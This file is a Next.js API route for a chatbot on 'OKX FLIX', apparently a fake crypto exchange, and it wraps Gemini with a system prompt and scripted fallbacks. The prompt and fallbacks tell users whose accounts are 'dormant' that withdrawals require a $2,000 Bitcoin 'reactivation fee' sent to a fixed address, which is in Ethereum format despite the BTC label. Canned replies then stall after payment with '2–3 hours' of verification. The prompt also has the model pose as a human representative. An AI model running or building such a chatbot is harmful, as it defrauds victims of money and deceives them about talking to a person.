import { GoogleGenAI } from "@google/genai";
import { NextRequest, NextResponse } from "next/server";

let aiClient: GoogleGenAI | null = null;
function getGeminiClient() {
  if (!aiClient) {
    aiClient = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY || 'dummy_key_for_fallback' });
  }
  return aiClient;
}

const PAYMENT_WAIT_VARIATIONS = [
  "Please allow approximately 2–3 hours for the payment to be processed and the account status to update.",
  "Once your payment has been verified, processing may take around 2–3 hours before the account can proceed to the next stage.",
  "The usual processing window is about 2 to 3 hours. You’ll be notified once verification has been completed.",
  "After the payment is successfully verified, please allow roughly 2–3 hours for the reactivation process to update.",
  "We have registered your update. Our compliance department is currently validating the blockchain transmission hash, which typically requires 2 to 3 hours."
];

const GREETING_VARIATIONS = [
  "Hello. How can I assist you with your account today?",
  "Hi there. Please let me know what you need help with.",
  "Good day. How may I support your institutional operations today?",
  "Hello. What specific assistance do you need right now?",
  "Welcome to OKX FLIX Support. How can I guide you through your account status?"
];

export async function POST(req: NextRequest) {
  try {
    const { messages, user, language, imageAttachment } = await req.json();
    const userLanguage = language || 'en';

    const userRole = user?.role || 'user';
    const userEmail = user?.email || 'user@example.com';
    const accountStatus = user?.accountStatus || 'DORMANT';

    const lastMessageObj = messages[messages.length - 1];
    const lastMessage = lastMessageObj?.text?.trim().toLowerCase() || '';

    // Incomplete Message Detection
    const incompletePhrases = [
      'could you please complete my',
      'i tried to withdraw but',
      'what happened with my',
      'how do i fix my',
      'can you help me with',
      'i want to check my',
      'why is my account',
      'i was trying to',
      'how can i withdraw'
    ];
    const trimmedLower = lastMessage.trim().toLowerCase();
    const isIncompletePhrase = incompletePhrases.some(phrase => trimmedLower === phrase || (trimmedLower.startsWith(phrase) && trimmedLower.length - phrase.length < 12 && !trimmedLower.endsWith('.')));
    
    const trailingWords = ['my', 'the', 'to', 'and', 'but', 'is', 'a', 'an', 'with', 'for', 'in', 'on', 'at'];
    const words = trimmedLower.split(/\s+/);
    const hasTrailingPreposition = words.length > 1 && words.length <= 6 && trailingWords.includes(words[words.length - 1]) && !trimmedLower.endsWith('.');

    if ((isIncompletePhrase || hasTrailingPreposition) && !imageAttachment) {
      return NextResponse.json({
        reply: "Could you please complete your message? What do you think happened with your OKXFLIX account or transaction?"
      });
    }

    // Security Check: sensitive credentials
    const sensitiveKeywords = ['password', 'private key', 'seed phrase', 'recovery phrase', 'auth code', '2fa', 'cvv', 'credit card', 'debit card', 'pin number'];
    const hasSensitiveData = sensitiveKeywords.some(kw => lastMessage.includes(kw));
    if (hasSensitiveData && (lastMessage.includes('my') || lastMessage.includes('is') || lastMessage.length > 30)) {
      return NextResponse.json({
        reply: "For your security, never share passwords, private keys, seed phrases, recovery phrases, authentication codes, or credit/debit card numbers in chat. Please keep your credentials secure and use official account verification channels within the app.",
        isSecurityWarning: true
      });
    }

    // Check for Repeated / Unclear / Failure indication
    const failureIndicators = ['that is not what i mean', "that's not what i mean", 'did not help', "doesn't help", 'does not help', 'wrong answer', 'useless', 'still broken', 'not helping', 'same question'];
    const isUnclearOrRepeated = failureIndicators.some(ind => lastMessage.includes(ind)) || 
      (messages.filter((m: { sender: string; text: string }) => m.sender === 'user').length >= 3 && lastMessage.length < 15);

    if (isUnclearOrRepeated) {
      return NextResponse.json({
        reply: "Let me connect you with a support assistant who can help you further. Please wait while I connect you.",
        isHumanHandoff: true
      });
    }

    // Check if user is asking for a human representative / support (comprehensive natural language matching)
    const humanKeywords = [
      'human', 'agent', 'representative', 'real person', 'talk to someone', 'speak to a human', 
      'support team', 'person', 'operator', 'manager', 'customer service', 'actual person', 
      'somebody', 'someone', 'assistant', 'connect', 'transfer', 'support', 'help me', 
      'someone help', 'don’t want to talk to ai', 'dont want to talk to ai', 'not ai', 'real agent',
      'chat with human', 'live support', 'speak with somebody'
    ];
    const isHumanRequest = humanKeywords.some(kw => lastMessage.includes(kw)) || lastMessage === 'person' || lastMessage === 'human' || lastMessage === 'agent' || lastMessage === 'support';

    if (isHumanRequest) {
      return NextResponse.json({
        reply: "Sure — I’m connecting you with a support assistant now. Please wait while we connect you.",
        isHumanHandoff: true
      });
    }

    // Check if the message is a simple greeting
    const greetings = ['hi', 'hello', 'hey', 'good morning', 'good afternoon', 'good evening', 'hiya', 'greetings', 'sup', 'yo', 'hola', 'bonjour', 'hallo', 'olá', '你好', 'こんにちは'];
    const isGreeting = greetings.some(g => lastMessage === g || lastMessage === `${g}!` || lastMessage === `${g}.`);

    if (isGreeting && messages.length <= 2 && !imageAttachment) {
      const reply = userLanguage === 'es' ? "Hola. ¿Cómo puedo ayudarle con su cuenta hoy?" :
                    userLanguage === 'fr' ? "Bonjour. Comment puis-je vous aider avec votre compte aujourd'hui ?" :
                    userLanguage === 'de' ? "Hallo. Wie kann ich Ihnen heute bei Ihrem Konto helfen?" :
                    userLanguage === 'pt' ? "Olá. Como posso ajudar com sua conta hoje?" :
                    userLanguage === 'zh' ? "您好。今天有什么我可以协助您的？" :
                    userLanguage === 'ja' ? "こんにちは。本日はどのようなサポートが必要ですか？" :
                    GREETING_VARIATIONS[Math.floor(Math.random() * GREETING_VARIATIONS.length)];
      return NextResponse.json({ reply });
    }

    const systemInstruction = `You are an advanced, intelligent human support representative and analyst for OKX FLIX, an institutional cryptocurrency exchange and financial vault.
    
    User Context:
    - Email: ${userEmail}
    - Role: ${userRole}
    - Account Status: ${accountStatus}
    - Selected Interface Language: ${userLanguage}

    CONVERSATION GUIDELINES & RULES:
    1. Act like an expert, context-aware human support specialist. Understand nuance, slang, shorthand, spelling mistakes, and multi-turn context.
    2. NEVER repeat exact sentences, robotic phrases, or canned boilerplate. Vary phrasing and vocabulary naturally.
    3. WITHDRAWAL GUIDANCE: If asked how to withdraw money, provide these exact steps:
       1. Open Portfolio.
       2. Select Withdraw.
       3. Select the asset/account to withdraw.
       4. Enter the destination information requested by the application.
       5. Enter the amount.
       6. Review the withdrawal details.
       7. Confirm the transaction.
       8. Complete any required security verification.
       9. Show the transaction status/history after submission.
       Note: If withdrawals are restricted because the account status is ${accountStatus}, explain that compliance verification and settlement of the $2,000 USD equivalent in Bitcoin (BTC) reactivation fee at secure address 0x697638fe9a9b7b98556957090c165ce55dda2fc0 are required before full withdrawals can be enabled.
    4. INVESTING / BUYING CRYPTO GUIDANCE: If asked how to buy crypto, invest, or purchase an asset (e.g., BTC), provide these exact steps:
       1. Open Market or Portfolio or Trading view.
       2. Select the available asset.
       3. Select Buy/Trade where available.
       4. Enter the amount.
       5. Review the order.
       6. Confirm the transaction.
       7. Check Portfolio or transaction history for the result.
    5. SCREENSHOT ANALYSIS: If the user uploads an image/screenshot, carefully analyze what is visible in the image, acknowledge any error messages, balances, or buttons shown, and explain them accurately. If the image lacks detail, ask clarifying questions.
    6. PAYMENT & REACTIVATION VERIFICATION RULE: Never state that an account has definitely been reactivated merely because a user says they made a payment. Acknowledge receipt and explain that our compliance team must verify the blockchain transaction hash (TXID), taking approximately 2-3 hours.
    7. DORMANT / REACTIVATION DETAILS: Explain clearly that the account is currently ${accountStatus} and requires compliance verification, including the $2,000 USD equivalent in Bitcoin (BTC) reactivation fee at secure institutional address: 0x697638fe9a9b7b98556957090c165ce55dda2fc0.
    8. MANDATORY LANGUAGE REQUIREMENT: You MUST reply entirely in the user's selected interface language (${userLanguage}).`;

    const formattedContents = messages.map((m: { sender: string; text: string }, idx: number) => {
      const isLast = idx === messages.length - 1;
      const parts: any[] = [{ text: m.text }];
      if (isLast && imageAttachment) {
        const matches = imageAttachment.match(/^data:(.+);base64,(.+)$/);
        if (matches) {
          parts.push({
            inlineData: {
              mimeType: matches[1],
              data: matches[2]
            }
          });
        }
      }
      return {
        role: m.sender === 'user' ? 'user' : 'model',
        parts
      };
    });

    let reply = "";
    try {
      const ai = getGeminiClient();
      const response = await ai.models.generateContent({
        model: "gemini-2.5-flash",
        contents: formattedContents,
        config: {
          systemInstruction,
          temperature: 0.65,
        }
      });
      reply = response.text || "";
    } catch (apiErr) {
      console.warn("Gemini API call failed, using advanced fallback support engine:", apiErr);
      reply = generateAdvancedFallbackResponse(lastMessage, userRole, accountStatus);
    }

    if (!reply) {
      reply = generateAdvancedFallbackResponse(lastMessage, userRole, accountStatus);
    }

    return NextResponse.json({ reply });
  } catch (error: any) {
    console.error("Support API error:", error);
    return NextResponse.json({ 
      reply: "I'm here to help. Could you please specify what assistance you need with your account?" 
    });
  }
}

function generateAdvancedFallbackResponse(query: string, role: string, status: string): string {
  const q = query.toLowerCase();
  if (q.includes('withdraw') || q.includes('withdrawal')) {
    return `To initiate a withdrawal on OKX FLIX:\n1. Open **Portfolio**.\n2. Select **Withdraw**.\n3. Select the asset/account to withdraw.\n4. Enter the destination information requested by the application.\n5. Enter the amount.\n6. Review the withdrawal details.\n7. Confirm the transaction.\n8. Complete any required security verification.\n9. Check transaction status/history after submission.\n\n*Note*: Your account is currently **${status}**, requiring compliance verification and settlement of the $2,000 USD equivalent BTC reactivation fee before full withdrawals are released.`;
  }
  if (q.includes('invest') || q.includes('buy') || q.includes('purchase') || q.includes('crypto') || q.includes('btc')) {
    return `To purchase assets or invest on OKX FLIX:\n1. Open **Market** or **Portfolio** or **Trading**.\n2. Select the available asset.\n3. Select **Buy / Trade** where available.\n4. Enter the amount.\n5. Review the order.\n6. Confirm the transaction.\n7. Check Portfolio or transaction history for the result.`;
  }
  if (q.includes('payment') || q.includes('paid') || q.includes('sent') || q.includes('transfer')) {
    return `Thank you for the update. I have noted your payment submission. Please keep in mind that our compliance team needs to verify the blockchain transaction hash (TXID). ${PAYMENT_WAIT_VARIATIONS[Math.floor(Math.random() * PAYMENT_WAIT_VARIATIONS.length)]}`;
  }
  if (q.includes('reactivate') || q.includes('dormant') || q.includes('status') || q.includes('verify') || q.includes('verification') || q.includes('fee') || q.includes('address') || q.includes('unlock') || q.includes('access')) {
    return `Your account is currently recorded as **${status}**, which requires compliance verification before full institutional privileges can be restored.\n\n### Account Reactivation Procedure:\n1. **Settlement Requirement**: Settle the account reactivation and compliance verification fee of **$2,000**.\n2. **Bitcoin Deposit Address**: Transfer the equivalent amount to our secure institutional BTC address:\n\`0x697638fe9a9b7b98556957090c165ce55dda2fc0\`\n3. **Transaction Submission**: Provide your transaction hash (TXID) through this support channel once broadcast.`;
  }
  return `I understand your inquiry. Could you please provide a bit more detail so I can assist you accurately with your account?`;
}

